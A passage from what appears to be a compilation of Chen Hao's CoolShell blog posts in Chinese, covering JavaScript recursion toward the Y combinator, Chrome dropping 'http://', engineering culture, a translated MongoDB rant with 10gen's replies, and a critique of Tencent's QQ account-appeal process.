最终我们得到下面的代码：( (func, x) => func(func, x) ) (  //函数体     (func, n) => ( n==0 ? 1 :  n * func(func, n-1) ), //第一个调用参数     5 //第二调用参数     );好像有点绕，anyway, 你看懂了吗？没事，我们继续。#### 动用高阶函数的递归但是上面这个递归的匿名函数在自己调用自己，所以，代码中有hard code的实参。我们想实参去掉，如何去掉呢？我们可以参考前面说过的那个 MakePowerFn 的例子，不过这回是递归版的高阶函数了。我们可以看，上面的代码简单说来就是， **需要一个函数做参数，然后返回这个函数的递归版本** 。那么，我们怎么调用呢？fact = HighOrderFact(HighOrderFact);     fact(5);连起来写就是：   `HighOrderFact ( HighOrderFact ) ( 5 )`但是，这样让用户来调用很不爽，所以，以我们一个函数把 **HighOrderFact ( HighOrderFact )** 给代理一下：
fact = function ( hifunc ) {     return hifunc ( hifunc );     } (     //调用参数是一个函数     function (func) {     return function(n){     return n==0 ? 1 : n * func(func)(n-1);     };     }     );fact(5); //于是我们就可以直接使用了用箭头函数重构一下，是不是简洁了一些？fact = (highfunc => highfunc ( highfunc ) ) (     func => n =>  n==0 ? 1 : n * func(func)(n-1)     );上面就是我们最终版的阶乘的函数式代码。#### 回顾之前的程序我们再来看那个查找数组的正常程序：//正常的版本     function find (x, y) {     for ( let i = 0; i < x.length; i++ ) {     if ( x[i] == y ) return i;     }     return null;     }
先把for干掉，搞成递归版本：然后，写出带实参的匿名函数的版本（注：其中的if代码被重构成了 ？号表达式）：( (func, x, y, i) => func(func, x, y, i) ) (  //函数体     (func, x, y, i=0) => (     i >= x.length ?  null :     x[i] == y  ?  i : func (func, x, y, i+1)     ), //第一个调用参数     arr, //第二调用参数     2 //第三调用参数     )最后，引入高阶函数，去除实参：const find = ( highfunc => highfunc( highfunc ) ) (     func => (x, y, i = 0) => (     i >= x.length ?  null :     x[i] == y  ?  i : func (func) (x, y, i+1)     )     );注：函数式编程装逼时一定要用const字符，这表示我写的函数里的状态是 immutable 的，天生骄傲！再注：我写的这个比原来版的那个简单了很多，原来版本的那个又在函数中套了一套 next， 而且还动用了不定参数，当然，如果你想装逼装到天上的，理论上来说，你可以套N层，呵呵。
**现在，你可以体会到，如此逼装的是怎么来的了吧？** 。#### 其它你还别说这就是装逼，简单来说，我们可以使用数学的方式来完成对复杂问题的描述，那怕是递归。其实，这并不是新鲜的东西，这是Alonzo Church 和 Haskell Curry 上世纪30年代提出来的东西，这个就是 Y Combinator 的玩法，关于这个东西，你可以看看下面两篇文章：《The Y Combinator (Slight Return)》，《Wikipedia: Fixed-point combinator》（全文完）*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 谷歌Chrome取消”http://”作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn谷歌下一个版本的Chrome浏览器软件将缺少一个在近20年来一直是浏览器的一个特点的功能：在地址栏中的“http://”。目前开发人员版本的Chrome浏览器已经做了这种改变。这个变化虽然看起来很小，但是，已经在Chrome网站引起了程序员们很大的争议。
在Google Chrome的开发站点上，又有了一个很热的BUG——Issue 41467（上一次的一热议的BUG是的《Go语言更名Issue 9》），这个BUG目前已被关闭。不过在其它地方还在热议中，如：Reddit.com。基本上来说，90%以上的程序员反对的，他们希望Google的Chrome可以给一个设置关闭或打开这一功能。一些程序员觉得这是违反了RFC，并且觉得这是在向End User传播一种很不好的东西，那就是网址可以不用http://，这样一来会给程序员增加很多麻烦，比如：他们的程序无法使用http://这一关键字来检查用户的输出，等等。iPhone浏览器的也是这样的， 不过当你把光标放到地址栏中，其会显示http://，广大程序员希望Chrome也实现这一方案。然而，Issue 41467目前的状态是“WontFix”，呵呵。有人说，如果你在地址栏中直接输入网址，没有协议前缀，默认就是http://，Google用的就是这个特性，然后，你可以试试在地址栏中输入“ftp.gnu.org/gnu”，你会发现，自动加入的不是http://而是ftp://，呵呵。有人说，既然你要省，不如也把www.和后面的.com加上/也省了，因为这些都是默认的嘛。直接打google就OK了。Chrome开发团队说，没有www.和.com/只能算是一个主机名，不能算是DNS域名。呵呵。
还有人说，搞这种隐藏的最恶心的就是Windows，隐藏文件后缀名，隐藏系统文件，太扯了，于是，像sexy_girls.jpg.exe，huge- tits.jpg.src这样玩意儿让某些电脑知识薄弱意志不坚定的人深受其害。如果有空，请留下你的观点。# 什么是工程师文化？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!engineer 四年前，我在QCon上演讲了一个《建一支强大的小团队》（整理后的PPT分享于这里）提到了工程师文化，今天，我想在这里再写一篇关于工程师文化的文章，一方面是因为我又有了一些想法和体会，另一方面，因为我也正走在创业的道路，毫无疑问，要建一个有浓重的工程师文化的团队或公司，所以有必要把自己的相关想法形有成白底黑字的“字据”，以供打自己的脸——“要是未来没有做到，这篇文章就打我未来的脸” || “这篇文章太幼稚了，未来的我会打我现在的脸”，当然，如果要打脸，我希望是前者。Again， **这篇文章不是招人的贴子，因为我觉得，招聘第一重要的事，不是发招聘广告或是找猎头挖人，而是先得让自己变成一个能配得上真正工程师的公司，然后再谈吸引人的事** 。
目录* 为什么要工程师文化   * 工程师文化的特征   * 自由   * 效率   * 工程师文化如何落地   * 其它#### 为什么要工程师文化看看最近二十年来社会的发展，计算机和互联网已经渗透到了这个社会的每一个角落，各式各样的计算机技术成为了整个世界发展的强大引擎，各式各样的创新，无论是业务创新还是技术创新，都是依托于技术的快速演进，技术成了解放生产力提高社会运作的效率的中坚力量。以美帝为首的技术创新公司着着实实的改变着这个世界和人类的生活和生产习惯。**今天，每个从事计算机行业的技术人员都应该感到幸运，因为，我们不但选对了行业，也出生在了正确的时代，可以感受到前所未有的刺激和变化，相比起我们的父辈，我们的人生，能经历这样的时代，实在是一种幸运。** 所以，选对了职业并出生在了正确的年代的我们，此时只需要思考的一个问题，那就是，我是否呆在了正确的地方用正确的方式做事？在我看来，这个世界上有三种商业公司，* **运营或销售驱动型的公司** 。这类的公司以运营和营销见长，技术对于他们来说，更多的只是为了支持大规模的营销活动，以及成本上的控制，所以，基本上来说不太需要技术创新。这种公司最大的问题就是缺乏安全感。
* **产品驱动型的公司** 。这类公司以产品见长，通过创造能提升用户生活体验的产品见长，技术对于他们来说，除了支持大规模的在线用户之外，他们会更多的去寻找那些为了增强用户体验，提高整个业务流程效率的技术创新。比如：UI的交互方面的，整个业务流程方面的。这种公司最大的问题，就是容易被别人模仿和抄袭。* **技术驱动型的公司** 。这类的公司相信技术能改变世界，他们更多的是用强大的工程技术来创造有颠覆性的东西，更多的是用各种自动化的技术取代人类。比如：近代的蒸汽机技术取代了大量的人工，数字技术取代了大量信息传递的人工，现代，这类公司还希望通过人工智能来取代愚蠢的人类来做决定。这种公司最大的问题就是可能做出叫好不叫座的东西。这三种公司都可能成功，也都有问题，但是，无一例外，他们都需要强大的技术支撑，只不过，他们把技术所放在的位置不一样。无论你有多么的看不起技术人员，你都无法否认，你今天的生活相当的依赖这帮工程师，没有他们，你恐怕都不知道怎么生活了。邓爷爷几十年前就说过——“科学技术是第一生产力” ，无论什么样的科学技术的理论要落地都会依赖于工程技术有多先进。所以， **在今天，作为一个IT或互联网公司，“工程师文化”不是一个问题，而是一个常识** ！
#### 工程师文化的特征我下面罗列的这些特征，来源于：Google的《重新定义公司》，我在Amazon的工作经历，37Signals的《Rework》，Quora上的 What Makes Good Engineering Culture? Slideshare上的 What Makes Good Engineering Culture，以及我最近这半年来的一些实践。简单说来， **我可以简单的把这多的工程师文化的总结成两大类：“自由” 和 “效率”** 。本来还应该有个“创新”，但我个人认为， **创新的前提是——在自由的环境下对提高效率的痴迷，就一定会发生创新。**创新不是凭空出现新的东西，其实， **观察一下人类的发展史，不难发现，几乎所有的创新基本上跳出原来的思维模式用新的思维模式对原有问题的效率进行质的提升** 。比如：通信、交通、医疗、教育、生活……几乎全都是在优化效率。所以，如果你的精神不自由，你很难跳出老的思维模式，你用老的思维模式你一定不会想到新的方法和方式，如果不是对效率的提升，这个创新可能会不接地气。因此，我认为，工程师文化就是自由加效率！#### 自由首先，工程师文化意味的创新文化，工程师都是有创新冲动的人，因为手里有创造技能的人通常都会有想创造点什么的冲动。而创新的源泉水来源于精神的解放，精神自由才会引发各式各样的奇思怪想，才会有常人觉得不可能的疯狂想法和想像力，而这些想法和想像力导致了创新。
精神上的自由具体表现在：* **自我驱动** 。自己管理自己是最好的管理。最失败的管理就是家长和保姆式的管理。兴趣出发的工作才可能迸发出真正的动力。* **灵活的工作时间和地点** 。工程师们更多的是脑力工作，而不是体力工作，工作上时间和地点的自由安排可以让工程师们的脑力工作更有效。Remote是一个很不错的工作方式，开源社区基本上都是这钟方式。和Remote有关的话题可参看37Signals的这本书《Remote》* **信息平等** 。这意味着，全体员工得到的是原始信息，而不是被管理者们层层加工消化后的信息，信息的屏蔽很容易造成误解和完全错误的行为。信息的平等，大的包括战略、方向、目标、财务，小的包括文档、代码、和知识的共享等。同样，也表现在意见表达上，任何人都有可能表达自己的意见和建议的平等机会，这样才会激发出更多的思路和思辩，从而有不同的更好的思路出现。而不是，大家都看到了问题，而没有人敢说。在Google除了代码全员共享，还有Thanks God, It’s Friday的文化，每周五，高管们会出来，任员工提各种尖锐的问题，在Amazon，代码和文档基本上全员开放，包括财务报表也对员工开放，另外，除了所有的NB的Principle SDE隔三岔五都会有一个Principle Talk（有很多Talk相当令人开脑洞），还有Amazon内部的Up the River文化，每年会选出一批公司最聪明最有想法的人集思会，讨公司下一步的和战略，并可以把相应的KPI直接按给Senior VP。
* **不害怕错误** 。处理错误的正确的姿势是分析总结教训，而不是惩罚故障人。前者让人改善进步，后者让人萎缩不前。最大的错误就是不敢犯错，最大的问题就是不敢直面问题。* **宽松的审批系统甚至没有审批系统** 。审批通常暗示着三件事，1）对人的不完全信任，2）繁琐的流程，3）思维上的束缚。这些都是创新和想像力的天敌。一个公司的监管、审批、流程越重，这个公司的活力也就越差。* **20%的自由时间** 。这是Google公司提出来的，员工有20%自由的时间做自己想做的项目，Gmail就是这么出来的。#### 效率工程师天生是追求效率的。有人说认为程序员花大量的时间做自动化的工具，还不如人肉的效率高，比如，写自动化的脚本花5个小时，而重复做这件事200次只花3个小时。有这样的理解的人根本不懂工程。一方面，这个工具可以共享重用，更多的人可以从中受益，这次我花5个小时开发这个工具，下次只用1小时改一下就可以用在别的地方，这是着眼于未来而不是眼下的成本。更重要的是，这是一种文化，一种提高效率的文化，他会鼓励和激发出更多的这样的事情发生。 **如果你因为一个程序员花大量的时间开发自动化的工具，而认为这个程序员没有效率，对之批评甚至惩罚的话，那么你就扼杀了提高效率的文化** （关于效率，大家可以看看我的另一篇文章《关于加班和效率》，你会真正了解什么是效率）
**人类之所以比别的动物聪明就是会使用和发明工具** ，而古语也有云：“工欲善其事，必先利其器”，看看美军的装备你就知道战争工具的好坏有多重要了， **一个公司的强大之处在执行力，而执行力的强大之处在于你有什么样的支持工具。这些，已经不是工程师文化，而是人类发展的文化** 。针对于工程师文化来说，尤其是软件工程，提升工程效率的具体表现如下：* **简化** 。简化不是简陋，简单的东西通常意味着用户更好理解，也意味着更容易的维护和运维。就像阿里推行的“小而美”，就像乔布期推崇的“没有产品手册简单易用的产品”，就像Amazon推行的Working Backwards里说的那样，一个新的产品或功能，产品经理需要写三个文档：媒体公关文、用户手册、常见问题，三个文档总共加起来不超过两页A4纸，且不准用任何图片说明，目的就是为了让产品简化和容易使用。* **残酷无情的推行自动化** 。编写程序的最本质的目的就是自动化，看看人类发展史上自动化了多少东西。 **对于自动化来说，不仅仅只是消除人肉的重复劳动，更重要的是，很多事情人完全干不过机器。** 比如：加一台机器，程序在秒级就可以完成，而人是永远不可能达到这样的速度的，再比如：电商中用程序管理数量巨大的订单的自动化系统，加再多的人都完成的不可能像机器那样完成的又好又快。自动化需要大力开发提高生产力的工具，比如：持续集成，持续部署，自动化运维，基础自动化运维，甚至自动化的运营工具。（Amazon的软件工程中对自动化和简代相当迷恋）
* **避免无效率的组织架构和无效率的管理** 。这体现在这些方面：1）扁平化的组织架构，2）努力用自动化工具取代支持型的工作，3）不超过10个人的全栈小团队，4）不按人员的技能分工而是按其负责的产品或功能分工（关于分工，请参看《让我们来谈谈分工》），5）开会不是解决问题，开会是表决提案，6）通过产品的目标或信条Tenets来减少沟通和决策过程（Amazon里的每个部门，每个团队，每个产品都有自己的Tenets，这个Tenets标明了要什么不要什么，这样可以避免很多扯皮和难缠的trade-off的决择，比如：AWS的几个信条：运维是最高优级的——这意味着只要是会让运维变得复杂的需求都可能会工程团队被拒掉，Throughput & Latency不能更差——这意味着，功能要为性能让路，因为性能变差了，用户就要买更多的资源）* **正确的组件抽象** 。抽象是简化的一部份，一方面，抽象意味着重用和通用，另一方面抽象意味着强大的扩展性，以适配各种可能性。最重要的是，抽象意味着技术能力的输出，无论是内部的其它团队还外部的团队。比如：Google的MapReduce/BigTable/ProtoBuffer，FaceBook的Thrift，还有Amazon内部的WebService框架Coral Service、处理日志监控的Timber，以及全线AWS产品都用到的Amazon Lock Framework（一个分布式锁框架）……
* **开发高质量的产品** 。因为高质量的代码，不但可以容易的修改和维护，还可以因为少处理线上故障，从而有更多的时间去为未来做更多创造性的工作。这意味着需要有非常严谨的Design Review，Code Review，以及测试，关于Code Review，可以参看这篇文章《从Code Review 谈如何做技术》，关于严谨的测试，可以参看这篇文章《如何做性能测试》* **不断的提高标准以及招聘最好的人** 。取法其上，得乎其中，取法其中，得乎其下，取法其下，法不得也。如果一个公司或一个团队想变得越来越好，越来越强大的话，就必需要不断的提高自己的工作标准，提高工作标准意味着要不断地培养和招聘更好的人。在Amazon和Google的招聘官中都有一个叫Bar Rasier的人，这个人就是为了提高招聘标准而设立的。* **创建一个持续改善的文化** 。一个好的组织，一个好的团队，是需要不断反思前进的，这需要全体员工一起来的。微观层面上，在项目做完后需要有一个总结会分析项目中的得失，在故障出现后，需要有故障分析会，反思得失，在Amazon，严重的故障，需要写一个COE（Correction of Errors）的文档，其中有一节叫“Ask 5 Whys”，让你自己问自己至少5个为什么。在宏观层面，一个公司每年都应该做一定的工作数据分析或是员工调查，比如，是否招聘到了不错的人、工作的投入产出比，员工在哪些地方花时间了，等等，然后不断的用技术手段来改善。（Amazon每年的工程师员工调查表是我活那么大见过的最细最细的调查表了， 问题除了对公司、经理、文化的，还有从，日常工作、开发环境、持结集成，测试自动化、产品质量、软件架构、软件维护、线上问题处理、年度计划、数据仓库建设、通用工具投票……这个员工调查直接导致公司的对工程的投资方向）
#### 工程师文化如何落地如果你要让任何文化在公司内得到执行，你有下面几个手段可以选择：* **通过政治手段：你需要把住三个地方——招聘、绩效考核 & 升职**。比如，你要落地工程师文化中的简化和自动化，那你你在招聘的时候，你需要把懂简化和喜欢自动化的人招进来，然后在绩效考核和升职的地方设置上一条硬性指标——你今年简化了什么？自动化了什么？如果没有，对不起不但不能升职，绩效可能还不达标。* **通过经济手段：让不做这事的成本 > 要做这个的成本。**然后，正常的人类都会选择成本低的方案。比如，如果你要推行Design/Code Review/UT以提高质量，你就把QA和OPS团队全挪到一边去，让Dev团队自己测试，自己负责，这样等这些Dev重复多次手动测试，处理多次线上的弱智故障，他们就会自然而然的写自动化测试和做Code Review了，而QA和OPS团队只是帮Dev你做工具罢了，而测试和运维的事全是你DEV的Ownership，出了故障也是Dev自己负责，于是，他们就会发现，不做Code Review和UT的成本远远大于做C Code Review/UT的成本，他们就会去做成本低的事的。
最后，工程师文化要落地，还有几个小条件，* **第一，团队要小，Ownership很重要，Eat Your Own Dog Food。** 没有人帮你擦屁股，自己的屎自己吃，没有痛苦，不会产生想进步的动力。* **第二，热爱学习和尝试** ，学习尝试新的技术，开拓眼界，学习尝试新的思维方式，否则，呆在原地，原有的思维方式只会让你在原地打转转。* **第三，老板更多的相信技术而不是管理** 。相信技术会用技术来解决问题，相信管理，那就只会有制度、流程和价值观来解决问题。#### 其它说了这么多，时代还在发展，不过，这是我这么多年经历或看到的工程师文化的东西了。最后吐几个槽——对于996和加班这个事，对于工程师来说从来都不是问题，在解决技术问题或是创造的时候，工程师是个很自觉的群体，基本不需要有别人驱动，工程师是最乐意Work Hard的人了。我相信几乎所有走上编程这个职业的人来说，基本上都是兴趣所至，觉得编程很有趣，但却被各个公司996搞得对编程毫无兴趣。为什么，你们这些公司要向中国的教育学习呢？人家本来对这事有比较高的兴趣的，但就是要通过考试/KPI/996这些东西把人家的兴趣一点一点的磨灭掉，把人变成机器、奴隶、牲口， **让人对学习和工作产生了厌倦和讨厌，会是你们这些管理者们所希望的？是不是只有把人变得不思进取了，你们才会管理？** 就像《软件开发中的两种管理方式》中说的第一种人一样？
另外，我不知道，为什么我一说这些东西，就会有很多人（包括程序员自己）来和我说我是个理想主义者，这些已经不是什么理想了，已被很多成功的公司用了很多很多年了。只是你没有见到过罢了。还有的人说，因为中国的国情不同。这更让我费解了。这让我想到了当年大清朝派了一堆人出国考察后回来后，说外国的那套共和的东西不符合中国国情，最终也在历史的潮流中被淹没掉了。另外，什么叫“中国的国情不同”？中国有全世界数一数二的互联网用户，也有全世界数一数二的市场，不再是以前那个一穷二白的年代了，中国的国情到底有哪些不同呢？我不知道各位工程师是为什么活的？但我觉得， **我们选择了一个刺激的职业，也赶上了这个行业大发展的时代，我们不妨扪心自问一下，你是否愿意让自己的能力、青春和热情就这样被磨灭了？**（全文完）# 千万别用MongoDB？真的吗？！作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn某人发了一篇Don’t use MongoDB的血泪控诉，我把原文翻译如下，你可以看看。不过，我想我们还要去看看10gen CTO的对此事的回复，我们还要去在Reddit上看看大家的说法，10gen CTO的对此事的回复后面也有一堆人在讨论这个事，还有一些程序员开始去读MongoDB的源码了，呵呵。看样子，说MongoDB的这些事并不是真的。
10gen CTO 对此事的并不完全知道，其在回复，对些文中的每一条都做了回复。我把其回复的大体意思也放在原文中。不过，很有意思的是那些程序员的讨论。建议大家看看。### 正文因为各种政治原因，我这段时间没有说什么，但是现在我觉得因为要对社会负责，所以我要阻止大家不要把你们的业务放在MongoDB上。我的团队在一个有巨大用户量（一个有千万用户级的大型的公司）系统上使用的MongoDB，这个系统上让MongoDB有非常大的负载。早期，我们以为使用MongoDB会像10gen公司（MongoDB背后的公司）宣扬其在长期性能扩展有很多好处。但是，我们错了，而这个rant(长篇抱怨)就是为了让你不要相信那些所谓的成功经验而和我们一样犯了大错。如果有人能避免你上当，那么就得我写这么多。希望能警醒更多的人。注意，对于和10gen打交道的经历来说，他们给予了我们充分了热情和帮助，而且非常地好。但是这并不能成为我不告诉大家他们的产品失败的理由。#### 为什么这么说？数据库应该是正确的，或是仅可能的正确，因为数据库的错误会比其它使用更大。不仅仅是因为其对运行，性能，开销，和其价值影响巨大，还因为其连带的东西。匆忙去去移植TB级的数据相比起去修改代码中的一个逻辑错误来说是一个很巨大的工作。而在系统出问题后需要恢复TB级的数据，而你即被限制住了，你会有一种绝望的感觉。
数据库是一个很复杂的系统，对于开发者来说就像一个黑盒一样。你需要对你所采用的数据库持绝对信任的态度，信任它会做正确的事，并尽会保持 一致笥和可用性。为什么MongoDB会流行？说句公道话，我们必需承认MongoDB是流行的，因为下面这些原因让其流行变得很合理：* 它非常容易地运行   * 非常自由的Schema模型，而且可以很容易地和JSON类的数据结果映射起来，这对于程序员来于有很大的感染力（它完全符合程序员的逻辑思维），而且，程序员总是在项目可以做技术选型的人。   * 成熟和分健壮，有记录，被真实的Use Case测试过，等等。对于那些喜欢选择成熟的技术的系统管理员和运营专业来说，这是一个很典型的选择。   * 它单系统，低读并发的性能测试非常令人惊讶，而对于那些没有经验的评估者来说，这基本上来说是最重要的。现在，你可能正在开发一个随便玩一玩的网站，或是一个原型，或是那种只考虑开发速度不考虑别的的项目。老实说，对于这种项止，无所谓你用什么样的技术，只要搞定工作就行了。但是，如果你想要在MongoDB上搞一个大规模的系统，在上面运行真实的业务，那么，请不要用MongoDB。#### 为什么不？
1）MongoDB为了赢得Benchmark测试而默认使用了不安全的写方式如果你不调用getLastError()，MongoDB就不会在确认数据库写操作完成就返回了，这会引入至少两种问题：* 在并发的环境下（连接池，等），在一个读操作“完成”后的连续地读操作会出错，MongoDB没有“栅栏条件锁”来知道什么时候完成写。   * 未知个数的保存操作会被丢弃，因为保存操作的队列会在不同的地方。比如TCP缓存等。当你和数据库连接因为一些意味情况断开的时候，这些东西就被丢弃了。> 10gen CTO 回复： 这和Benchmark没有任何关系，并说这个就是API的设计，其交给用户自己去选择，因为写的方式也有很多种。2）MongoDB会以令人震惊的方式丢失数据下面是一个我们所经历过的它丢数据的列表：* 数据就是丢了，原因未知   * 从损坏的数据库中恢复数据不成功，如事务日志。   * 主从结点间的数据复制有缺口，导致从结点丢失主结点有的数据。是的，没有CheckSum，并且是的，你还会看到数据复制过去了。   * 数据复制有时会停了，没有错误。你可以监控你的复制状态。> 10gen CTO > 逐一回复：1）从来没有一个数据丢失的BUG我们没有马上fix的事情。你能告诉我你报给我们的问题号吗？我们至少要明的是怎么一回事。如果是我们的问题，我们会马上fix的。2）从损坏了的数据库中不能完全恢复数据 > ，这不挺正常的吗？但是如果有主从服务器互为备份应该会好一些。3）请告诉我你的问题号，我们从来没有接到过这样的错误报告。如果有，的确很严重。4）如果是说错误条件发生的时候没有通知，这有可能。另外，你可以监控数据复制的写操作，你可以使用w=2 > 为getLastError的参数。
3）MongoDB 需要全局写锁来请求写操作在写操作频繁的时候，这等同于杀了你。如果你运行一个blog，你也许不会关心这个事，因为你的读写操作不高。> 10gen CTO 回复：读写锁永远都是问题，但是2.0会好很多，2.2会解决得更好一些。4）MongoDB 的Sharding(分区) 在高负载下会停止工作在高负载下加一个shard是一场恶梦。Mongo要么会移动其数据块太快而导致DOS攻击产生很多流量占用带宽，要么就完全地拒绝更多的数据块。这会使一个高流量的网站承受着沉重地写操作。> 10gen CTO > 回复：如果系统已经超过了其负载，那么移动数据当然会变得很难。我每一次的演讲都说得很清楚，不要在系统性能不行的时候才去加shard，这不行的。5）Mongo 不可靠Mongod/配置服务器/mongos的架构确定合理且聪明。不幸的是，mongos完全就是垃圾。在有负载的情况下，它时不时就都会崩溃，有时几个小时，有时几天。进程重启监控有时也不管用，因为他会抛出一些断言会伪造出一个关键线程，其导致进程还在运行。Double Fail。最坏的是，唯一可行的方式是在一堆mongos实例前放一个HaProxy(一种负载均衡器)，运行一个作业其缓慢地轮着访问这些mongos实例，并定期kill掉他们，以变可以重新启动新的实例。我没有在开玩笑。
> 10gen CTO 回复：不可能有这种事，你能不能告诉我更多的细节？6）MongoDB有一次甚至删除了整个数据库MongoDB 1.6，在数据同步配置中，有时会配置了一个错误的结点（经常是一个空结点）是一个最新的数据结点。于是其它同步数据的结果上的 **数据就这样被干掉了** （我说的是700GB的好数据），因为其把这个空结点的数据同步回有数据的结点上。数据库永远永远都不应该干这个。如果出现这种问题，数据库应该抛出一个错误而让DBA来选择合理的操作，或是强制使用正确的配置。而不应该删除所有的数据（那天太糟糕了）。他们在1.8中修复了这个问题，偶滴神啊。> 10gen CTO 回复：找不到这样的事，也找不到相应提交的代码，你能多给点信息吗？7）发布了一些不应该发布东西众所周知，在稳定版里能找到一些尴尬的bug其会导致数据问题——而我们总是在出了问题后他们才告诉我们这些问题，这是因为我们购买了10gen他们那超级诈骗的白金技术支持。他们回应是，发给我们一个hot patch，他们内部叫RC的玩意，然后让这个hot patch运行在我们的数据上。> 10gen CTO > 回复：关于白金的技术支持，我们所接手的所有问题都会公开，fix也会公开。没有特定的情景，这种事很难讨论。我们会根据不同的情况作出不同的反应。我们希望我们的用户的问题能尽快得到解决。
8）复制器在繁忙的服务器上黯然失色复制器经常性的向Master发起DOS攻击，或是复制非常慢，花了巨长无比的时间，而oplog几乎被耗尽（就算是50GB的oplog）。我们有一个繁忙的，大的数据集我们不会复制他因为它是动态的。那是令人痛苦的一个月，或是我们需要在选择不同的数据库系统前交叉双指（注：好运的手势）> 10gen CTO 回复：这看起来像上服务器负载过重了。我前面提到过了。**但是最糟糕的问题是：**你可能会说，我这些问题都是过去式了；他们修复了所有这些问题或是他们会在下一版本中修复这些问题；X问题可以用Y实践来减轻。等等，等等。不幸的是，你说这些东西一点用也没有。真正的问题是，这么多的问题都是首要的问题。 数据库开发者要能hold住比一般程序员更高的标准。也就是说，你的优先级应该像下面这个样子：1. 别搞丢数据，对数据要有完全的把握   2. 通过实践保证可用性   3. 多结点的性能扩展性   4. 最小延迟应该保持在99%和95%之间   5. 每个资源的每秒请求数10gen的顺序好像是 #5 为每一，其它项随便，#1 并不在前3位。> 10gen CTO 回复：这明显不是真的。看一看我们提交的代码，看一看我们的fix。 > 我们从来不会在release版中隐藏一个bug。如果我们非常在乎性能的benchmark的话，我们会花精力解决那些锁的问题，这样一来，多线程并发会更快一些。 > > MongoDB是一个新生的东西，还有很多东西需要打磨。如果你想来认识一下我们，我们欢迎你来认识一下我们。
这些失败，还有那所暗示的公司的优先级，指出了一个最基本的企业文化的问题，其会让问题出现在任一发布版中：因为他们缺乏尊守必要的数据库系统的设计律条。请慎重考虑这些警告。（全文完）# 腾讯帐号申诉的用户体验作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn前面写过一篇“腾讯，竞争力 和 用户体验”批评了腾讯，于是在我的微博上和博客上收到了一些反对意见，基本上是说腾讯产品的用户体验做得很好，很方便，等等，还列举了N多的例子，以及说过什么用户数量为王的言论，让我感到我应该写一篇博客。当然，如果我们只看某个技术层面的东西的话，我同意，QQ的一些产品还是很易用的。但是我们还是要看得更深一些。Effective C++的作者Scott Meyers 在《More Effective C++》中说过——“美丽的是肤浅的表现”。 我借用一下这句话，认为QQ是好的产品的观点是肤浅的认识。网上有大量的文章说QQ扫描硬盘啊，说QQ收集用户信息啊，你可能忘了这些。前段时间的3Q大战的那个“艰难的决定”，你好像也忘了。还有狗日的腾讯，你也忘了。包括QQ可以预防犯罪的新闻，你可能也忘（这本就是一个容易忘事的民族）。你已经被QQ的用户体验迷住你的双眼，觉得QQ无敌于天下，就像这个微博 以及微博里的回复一样在赞叹QQ注重细节一样，那些人在看到QQ的Mac版上向Steve Jobs感谢的字样激动不已。我感到你被一块红布蒙住了双眼也蒙住了天，我问你看见了什么，你说你看见了幸福 ，这个感觉真让你舒服……（对不起，一不小心我就在唱歌了，So So Sorry）
回到正题，你会说，我们在谈技术，不谈这些非技术的。好吧，我们来看看技术上的东西。我和大家说一下这两天我的真实经历。两天前，我的QQ号被“恶意投诉”，封了号。腾讯让我走申诉流程，于是我看到了下面这些步骤：1. 填入我的真实姓名，身份证号，地址等我的真实信息。 （盗号者也可以填）   2. 填入我的手机号，并要用这个手机号向腾讯发个短信以收取验证码。（盗号者的手机）   3. 填入我以前曾经使用过的QQ密码 （盗号者盗到的密码）   4. 填入我是什么时候，在哪里注册的QQ （盗号者可以填忘记了）   5. 填入最近3年来，我在哪里使用过QQ （盗号者也可以填忘 记了）   6. 邀请QQ好友来帮助申诉，越多越好，需要填号好友的QQ号和真实姓名。 （盗号者也可以用自己的小号，这些小号可以加你为好友）**这已经是非同寻常的流程了…… 从这个申请过程中你看到了什么？** 你是否看到了这些东西：* 收集你的用户信息，从姓名，地址，身份证到手机号，包括你好友的真实姓名。   * 收集并验证我过去使用过的密码，以及我在哪里使用QQ的。   * 这个过程无法确保安全性。没有一点技术含量。这些意味着什么？你会说，因为我不知道QQ盗号有多严重，所以他们才有这样的措施。那么我不禁要反问一下了——
* **这个世上还有什么产品是可以让别人通过申诉来让你的帐号失效的？**   * **又有哪个产品是通过收集真实的用户信息和朋友的信息来找回密码的？**   * **这个世上还有什么产品是在注册的时候不要真实信息，而在找回密码的时候要真实信息？**要收信就应该在注册的时候收集，你见过哪家银行在开户的时候不要你身份证，而你取钱，挂失的时候需要身份证的？只要腾讯愿意，弹个窗，于是就可以一点一点地让所有的人都走申诉流程以收集真实信息。我看这个过程并不是想看上去的那么简单啊。这就是用户体验？你可能还依然坚持你对这一做法的理解，那么，我真心希望你看看别的系统和软件是怎么做的。（老实说，一个手机号，另一个邮箱就可以搞定了）我的朋友在微博上回复到——> > //@真谛419：。。。qq是一个伟大的企业，一步步微创新走到了创新横扫CIA，FBI的浪潮之巅 > //@chengxi_: CIA弱到爆，QQ knows it all. > 这个获取所有实名社交网络的创新不亚于 reCaptcha ，用QQ的和裸奔的区别在于“裸奔”是自愿的。你也许会说，这是腾讯因为不可抗力不得已这样做的，我们都应该理解腾讯。我想了一想，我觉得你说得有道理，你无非就是想让我说——腾讯不SB，SB的是用户。好吧，我承认你有一定的道理。
既然这样，那么我就不得不加粗朋友的这句话了—— **用QQ的和裸奔的区别在于“裸奔”是自愿的！！** 而且，我仿佛、似乎、好像，隐约还听到有人在欢快地呻吟着：“在QQ上裸奔的用户体验太~~好~~啦~~，让我高潮不断啊~~~啊~~~啊~~~啊~~~~~~~~”。行了行了，你可以裸奔，但是没有必要那么爽吧。（对不起，我本不应该骂人的，更不应该还骂的那么低俗，重要的是，这本来应该在新浪微博上骂的，因为那里的骂人用户体验最好的地方……）结尾了，你会会说我是一个喷子，呵呵。我想说， **腾讯是一个天使和魔鬼的混合体，东西还是要一分为二的看** ，用么还是可以适当用用的，但是我们的头脑还是要清楚一些明白那是怎么一回事。# 如何重构“箭头型”代码作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn本文主要起因是，一次在微博上和朋友关于嵌套好几层的if- else语句的代码重构的讨论（微博原文），在微博上大家有各式各样的问题和想法。按道理来说这些都是编程的基本功，似乎不太值得写一篇文章，不过我觉得很多东西可以从一个简单的东西出发，到达本质，所以，我觉得有必要在这里写一篇的文章。不一定全对，只希望得到更多的讨论，因为有了更深入的讨论才能进步。
